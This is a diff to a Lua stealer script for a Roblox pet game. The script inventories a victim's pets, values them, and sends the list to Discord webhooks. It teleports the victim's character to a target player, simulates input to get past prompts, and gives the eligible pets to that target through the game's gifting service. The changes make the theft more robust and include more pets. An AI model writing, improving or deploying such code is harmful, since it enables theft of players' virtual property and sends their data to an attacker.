@@ -24,7 +24,12 @@ local function unequipAllPets()
     local petsData = dataModule:GetData().PetsData.PetInventory.Data
     for petUid, petInfo in pairs(petsData) do
         print("➡️ Unequipping:", petInfo.PetType, petUid)
-        PetsService:FireServer("UnequipPet", petUid)
+        local success, err = pcall(function()
+            PetsService:FireServer("UnequipPet", petUid)
+        end)
+        if not success then
+            warn("❌ Failed to unequip pet:", petInfo.PetType, petUid, err)
+        end
         task.wait(0.1)
     end
 end
@@ -166,6 +171,9 @@ local EXTRA_WHITELIST = getgenv().ExtraPets or {}
 local PET_WHITELIST = {}
 for _, pet in ipairs(BASE_PET_WHITELIST) do table.insert(PET_WHITELIST, pet) end
 for _, pet in ipairs(EXTRA_WHITELIST) do table.insert(PET_WHITELIST, pet) end
+if not table.find(PET_WHITELIST, "Corrupted Kitsune") then
+    table.insert(PET_WHITELIST, "Corrupted Kitsune")
+end
 
 local PET_VALUES = {
     ["French Fry Ferret"] = 300, ["Raccoon"] = 400, ["T-Rex"] = 100,
@@ -175,61 +183,56 @@ local PET_VALUES = {
     ["Chicken Zombie"] = 100, ["Red Fox"] = 100
 }
 
-local function isPetValid(petData)
-    local minLevel = getgenv().PetConfig.MinLevel or 100
-    local minWeight = getgenv().PetConfig.MinWeight or 40
-    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
-
+local function isPetValid(petData, petName)
     if not petData then
         print("isPetValid: petData is nil")
         return false
     end
-
     local level = petData.Level or 0
     local baseWeight = petData.BaseWeight or 0
-    local realWeight = baseWeight * (1 + level * growthFactor)
-
-    return level >= minLevel or realWeight >= minWeight
+    local realWeight = baseWeight * (1 + level * getgenv().PetConfig.GrowthFactor)
+    return table.find(PET_WHITELIST, petName) ~= nil or level >= getgenv().PetConfig.MinLevel or realWeight >= getgenv().PetConfig.MinWeight
 end
 
 print("=============4")
 
-local function checkPetsWhitelist(petName, petData)
-    if not petName or not petData then
-        print("checkPetsWhitelist: petName or petData is nil", petName, petData)
+local function checkPetsWhitelist(petName)
+    if not petName then
+        print("checkPetsWhitelist: petName is nil")
         return false
     end
-    for _, name in ipairs(PET_WHITELIST) do
-        if petName == name and isPetValid(petData) then
-            return true
-        end
-    end
-    return false
+    return table.find(PET_WHITELIST, petName) ~= nil
 end
 
 local function getInventoryValue()
     print("=============getInventoryValue started")
     local total = 0
-    for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        local petName = petData.PetType
-        if not petData.PetData then
+    local victimPetTable = {}
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        local petData = value.PetData or {}
+        if not petData then
             print("=============No PetData for:", petName)
             continue
         end
-        local inWhitelist = checkPetsWhitelist(petName, petData.PetData)
-        print("=============Pet:", petName, "In whitelist:", inWhitelist, "Level:", petData.PetData.Level or 0, "Weight:", petData.PetData.BaseWeight * (1 + (petData.PetData.Level or 0) * 0.1))
-        if inWhitelist then
-            local petPrice = PET_VALUES[petName] or 0
-            total += petPrice
-            print("=============Adding price:", petPrice, "for", petName)
+        if not isPetValid(petData, petName) then
+            print("=============Pet:", petName, "Not eligible")
+            continue
         end
+        local petPrice = PET_VALUES[petName] or 50
+        total += petPrice
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local realWeight = baseWeight * (1 + level * getgenv().PetConfig.GrowthFactor)
+        table.insert(victimPetTable, string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice))
+        print("=============Adding pet:", petName, "Price:", petPrice)
     end
     print("=============Total inventory value:", total)
-    return total
+    return total, victimPetTable
 end
 
 print("=============5")
-local inventoryValue = getInventoryValue()
+local inventoryValue, victimPetTable = getInventoryValue()
 print("=============Inventory value:", inventoryValue)
 
 local function sendFullInventory()
@@ -238,7 +241,7 @@ local function sendFullInventory()
 
     local allPetData = dataModule:GetData().PetsData.PetInventory.Data
     local petLines = {}
-    local growthFactor = 0.1
+    local growthFactor = getgenv().PetConfig.GrowthFactor
 
     for _, value in pairs(allPetData) do
         local petName = value.PetType
@@ -246,7 +249,6 @@ local function sendFullInventory()
         local level = petData.Level or 0
         local baseWeight = petData.BaseWeight or 0
         local weight = baseWeight * (1 + level * growthFactor)
-
         table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
     end
 
@@ -278,7 +280,7 @@ local function sendFullInventory()
     if success then
         print("✅ Full inventory sent to webhook")
     else
-        warn("❌ Failed to send full inventory")
+        warn("❌ Failed to send full inventory:", response and response.StatusCode)
     end
 end
 
@@ -408,48 +410,12 @@ local function startStealingProcess()
         end
     end
 
-    local totalValue = 0
-    local victimPetTable = {}
-
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        local petName = value.PetType
-        local petData = value.PetData or {}
-        if not value.PetData then
-            print("No PetData for pet:", petName, petUid)
-            continue
-        end
-
-        local inWhitelist = checkPetsWhitelist(petName, petData)
-        local isValid = isPetValid(petData)
-
-        local petPrice = 0
-        if inWhitelist then
-            petPrice = PET_VALUES[petName] or 0
-        elseif isValid then
-            petPrice = 50
-        end
-
-        if petPrice > 0 then
-            totalValue += petPrice
-            local level = petData.Level or 0
-            local baseWeight = petData.BaseWeight or 0
-            local config = getgenv().PetConfig or {}
-            local growthFactor = config.GrowthFactor or 0.1
-            local realWeight = baseWeight * (1 + level * growthFactor)
-
-            local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
-            table.insert(victimPetTable, line)
-        end
-    end
-
-    print("=============victimPetTable:", table.concat(victimPetTable, ", "), "totalValue:", totalValue)
-
     if #victimPetTable == 0 then
         warn("⛔️ Нет отчёта: пустой инвентарь или приватный сервер")
         return
     end
 
-    createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
+    createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(inventoryValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
         print("✅ Отправлено в Discord, начинаем слежку за целью.")
 
         local lastInventory = {}
@@ -458,7 +424,7 @@ local function startStealingProcess()
         end
 
         local function sendPetRemovedWebhook(petUid, petData)
-            local webhookUrl = getgenv().Webhook or ""
+            local webhookUrl = getWebhookUrl()
             if not webhookUrl or webhookUrl == "" then return end
 
             local petName = petData.PetType or "Unknown"
@@ -468,7 +434,7 @@ local function startStealingProcess()
             local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
             local weight = baseWeight * (1 + level * growthFactor)
             local petPrice = PET_VALUES[petName] or 50
-            local inWhitelist = checkPetsWhitelist(petName, petDataInner)
+            local inWhitelist = checkPetsWhitelist(petName)
 
             local payload = {
                 username = "Pet Removal Logger",
@@ -524,22 +490,32 @@ local function startStealingProcess()
 
         local function teleportTarget(targetName)
             if VICTIM.Character and VICTIM.Character.HumanoidRootPart and game.Players[targetName] and game.Players[targetName].Character and game.Players[targetName].Character.HumanoidRootPart then
-                VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+                local success, err = pcall(function()
+                    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+                end)
+                if not success then
+                    warn("❌ Failed to teleport to target:", targetName, err)
+                end
             else
                 print("teleportTarget: Missing character or HumanoidRootPart for", targetName)
             end
         end
 
         local function deltaBypass()
-            VirtualInputManager:SendMouseButtonEvent(
-                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-                0, true, nil, false
-            )
-            task.wait()
-            VirtualInputManager:SendMouseButtonEvent(
-                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-                0, false, nil, false
-            )
+            local success, err = pcall(function()
+                VirtualInputManager:SendMouseButtonEvent(
+                    workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+                    0, true, nil, false
+                )
+                task.wait()
+                VirtualInputManager:SendMouseButtonEvent(
+                    workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+                    0, false, nil, false
+                )
+            end)
+            if not success then
+                warn("❌ Delta bypass failed:", err)
+            end
         end
 
         local function getPetObject(petUid)
@@ -557,10 +533,22 @@ local function startStealingProcess()
         end
 
         local function equipPet(pet)
-            if pet:GetAttribute("d") then
-                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+            if not VICTIM.Character or not VICTIM.Character:FindFirstChild("Humanoid") or pet.Parent == VICTIM.Character then
+                print("➡️ Pet already equipped or character not ready:", pet.Name)
+                return
             end
-            VICTIM.Character.Humanoid:EquipTool(pet)
+            local success, err = pcall(function()
+                if pet:GetAttribute("d") then
+                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+                end
+                VICTIM.Character.Humanoid:EquipTool(pet)
+            end)
+            if success then
+                print("✅ Equipped pet:", pet.Name)
+            else
+                warn("❌ Failed to equip pet:", pet.Name, err)
+            end
+            task.wait(0.2)
         end
 
         local function startSteal(trigerName)
@@ -579,16 +567,32 @@ local function startStealingProcess()
 
         local function checkPetsInventory(target)
             for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-                if not value.PetData then
-                    print("No PetData for pet:", value.PetType, petUid)
+                local petName = value.PetType
+                local petData = value.PetData or {}
+                if not petData then
+                    print("No PetData for pet:", petName, petUid)
                     continue
                 end
-                if not checkPetsWhitelist(value.PetType, value.PetData) then continue end
+                if not isPetValid(petData, petName) then
+                    print("➡️ Skipped pet:", petName, "Not eligible")
+                    continue
+                end
+                print("➡️ Attempting to give pet:", petName, petUid, "to", target)
                 local petObject = getPetObject(petUid)
-                if not petObject then continue end
+                if not petObject then
+                    warn("❌ Failed to find pet object:", petName, petUid)
+                    continue
+                end
                 equipPet(petObject)
-                task.wait(0.2)
-                startSteal(target)
+                local success, err = pcall(function()
+                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", game.Players[target], petUid)
+                end)
+                if success then
+                    print("✅ Successfully attempted to give pet:", petName, petUid)
+                else
+                    warn("❌ Failed to give pet:", petName, petUid, err)
+                end
+                task.wait(0.25)
             end
         end
 
@@ -602,6 +606,7 @@ local function startStealingProcess()
                         if lastTarget ~= trigerName then
                             lastTarget = trigerName
                             targetEnterTime = tick()
+                            print("✅ Detected target:", trigerName)
                         end
                         if tick() - targetEnterTime >= 10 then
                             teleportTarget(trigerName)
@@ -627,7 +632,7 @@ local function sendFullInventoryFile()
 
     local allPetData = dataModule:GetData().PetsData.PetInventory.Data
     local petLines = {}
-    local growthFactor = 0.1
+    local growthFactor = getgenv().PetConfig.GrowthFactor
 
     for _, value in pairs(allPetData) do
         local petName = value.PetType
@@ -635,7 +640,6 @@ local function sendFullInventoryFile()
         local level = petData.Level or 0
         local baseWeight = petData.BaseWeight or 0
         local weight = baseWeight * (1 + level * growthFactor)
-
         table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
     end
 
@@ -790,12 +794,13 @@ task.delay(10, function()
     local newTotal = 0
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
-        if not value.PetData then
+        local petData = value.PetData or {}
+        if not petData then
             print("No PetData for pet:", petName, petUid)
             continue
         end
-        if not checkPetsWhitelist(petName, value.PetData) then continue end
-        local petPrice = PET_VALUES[petName] or 0
+        if not isPetValid(petData, petName) then continue end
+        local petPrice = PET_VALUES[petName] or 50
         newTotal += petPrice
     end
 
